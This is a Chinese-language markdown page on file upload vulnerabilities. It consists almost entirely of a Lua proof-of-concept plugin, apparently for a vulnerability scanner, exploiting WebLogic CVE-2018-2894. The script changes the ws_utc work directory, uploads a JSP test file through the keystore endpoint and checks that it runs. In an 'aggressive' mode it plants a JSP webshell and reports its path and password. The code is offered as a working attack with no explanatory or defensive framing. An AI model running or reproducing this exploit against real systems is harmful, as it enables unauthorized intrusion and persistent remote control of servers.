# 文件上传漏洞

## weblogic cve-2018-2894

```poc
local http = require("http")
local time = require("time")
local urlparse = require("urlparse")
local regexp = require("regexp")
local math = require("math")

function assign(service, params)
    if service == "weblogic" then
        local url, err = urlparse.join(params, "/")
        if err == nil then
            return true, url
        end
    end
end
function audit(params)
    local headers = {
        ['Content-Type'] = 'application/x-www-form-urlencoded',
        ['X-Requested-With'] = 'XMLHttpRequest',
    }
    -- getcurrent_work_path
    local geturl = urlparse.join(params, "/ws_utc/resources/setting/options/general")
    local resp = http.get(geturl)
    if resp.code == 404 then
        -- 不存在
        return
    elseif string.contains(resp.body:lower(), "deploying application") then
        -- first deploy
        time.sleep(20)
        resp = http.get(geturl)
    end
    local origin_work_path = ""
    if string.contains(resp.body, "</defaultValue>") then
        local result = regexp.find_all_string_submatch("<defaultValue>([^<>]*?)</defaultValue>", resp.body)
        origin_work_path = result[1][2]
    end
    -- get_new_wirk_path
    local works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
    local current_work_home = ""
    if string.contains(origin_work_path, "user_projects") then
        if string.contains(origin_work_path, "\\") then
            works = works:replace("/", "\\")
            current_work_home = origin_work_path:sub(1, origin_work_path:find("user_projects") - 1) .. "user_projects\\domains"
            local dir_len = current_work_home:count("\\") + 1
            local domain_name = origin_work_path:split("\\")[dir_len + 1]
            current_work_home = current_work_home .. "\\" .. domain_name .. works
        else
            current_work_home = origin_work_path:sub(1, origin_work_path:find("user_projects") - 1) .. "user_projects/domains"
            local dir_len = current_work_home:count("/") + 1
            local domain_name = origin_work_path:split("/")[dir_len + 1]
            current_work_home = current_work_home .. "/" .. domain_name .. works
        end
    else
        current_work_home = origin_work_path
    end
    -- set_upload_path
    -- TODO
    local data = "BasicConfigOptions.proxyHost=&BasicConfigOptions.workDir=%s&setting_id=general&BasicConfigOptions.proxyPort=80"
    resp = http.post(urlparse.join(params, "/ws_utc/resources/setting/options"), { data = string.format(data, http.urlencode(current_work_home)), header = headers })
    if not (string.contains(resp.body, "successfully")) then
        -- 不成功
        return
    end

    -- upload_shell
    local sep = "--7eb76dd629d6545cbe3f494a15642a72"
    local files = sep .. "\n"
    local test_filename = math.randomstr(8)
    files = files .. string.format("Content-Disposition: form-data; name=\"ks_filename\"; filename=\"%s.jsp\"\n", test_filename)
    files = files .. "\n"
    files = files .. string.format("%s\n", "<%=\"hello\" + \" vuln\" + \" i like\" + \" you\"%>")
    files = files .. sep .. "\n"
    files = files .. "Content-Disposition: form-data; name=\"ks_password_front\"; filename=\"ks_password_front\"\n"
    files = files .. "\n"
    files = files .. "360sglab\n"
    files = files .. sep .. "\n"
    files = files .. "Content-Disposition: form-data; name=\"ks_password_changed\"; filename=\"ks_password_changed\"\n"
    files = files .. "\n"
    files = files .. "true\n"
    files = files .. sep .. "\n"
    files = files .. "Content-Disposition: form-data; name=\"ks_edit_mode\"; filename=\"ks_edit_mode\"\n"
    files = files .. "\n"
    files = files .. "false\n"
    files = files .. sep .. "--\n"
    resp = http.post(urlparse.join(params, "/ws_utc/resources/setting/keystore"), { body = files, header = { ["Content-Type"] = "multipart/form-data; boundary=7eb76dd629d6545cbe3f494a15642a72" } })
    local result = regexp.find_all_string_submatch("<id>([^<>]*?)</id>", resp.body)
    local key = result[#result][2]
    local test_path = urlparse.join(params, string.format("/ws_utc/css/config/keystore/%s_%s.jsp", key, test_filename))
    resp = http.get(test_path, { header = headers })
    if string.contains(resp.body, "hello vuln i like you") then
        report_hole(string.format("%s", params), resp)
    else
        return
    end
    if aggressive then
        local files = sep .. "\n"
        local test_filename = math.randomstr(8)
        files = files .. string.format("Content-Disposition: form-data; name=\"ks_filename\"; filename=\"%s.jsp\"\n", test_filename)
        files = files .. "\n"
        files = files .. string.format("%s%s\n", "<%=\"hello\" + \" vuln\" + \" i like\" + \" you\"%>", KB["shell"]["jsp"])
        files = files .. sep .. "\n"
        files = files .. "Content-Disposition: form-data; name=\"ks_password_front\"; filename=\"ks_password_front\"\n"
        files = files .. "\n"
        files = files .. "360sglab\n"
        files = files .. sep .. "\n"
        files = files .. "Content-Disposition: form-data; name=\"ks_password_changed\"; filename=\"ks_password_changed\"\n"
        files = files .. "\n"
        files = files .. "true\n"
        files = files .. sep .. "\n"
        files = files .. "Content-Disposition: form-data; name=\"ks_edit_mode\"; filename=\"ks_edit_mode\"\n"
        files = files .. "\n"
        files = files .. "false\n"
        files = files .. sep .. "--\n"
        resp = http.post(urlparse.join(params, "/ws_utc/resources/setting/keystore"), { body = files, header = { ["Content-Type"] = "multipart/form-data; boundary=7eb76dd629d6545cbe3f494a15642a72" } })
        local result = regexp.find_all_string_submatch("<id>([^<>]*?)</id>", resp.body)
        local key = result[#result][2]
        local test_path = urlparse.join(params, string.format("/ws_utc/css/config/keystore/%s_%s.jsp", key, test_filename))
        resp = http.get(test_path, { header = headers })
        if string.contains(resp.body, "hello vuln i like you") then
            report_shell(test_path, KB["shell"]["jsppass"], "jsp")
        end
    end
    --print(current_work_home)

end

function test()
    local checkrun, param = assign("weblogic", "http://192.168.158.128:7001/")
    if checkrun then
        audit(param)
    end
end
```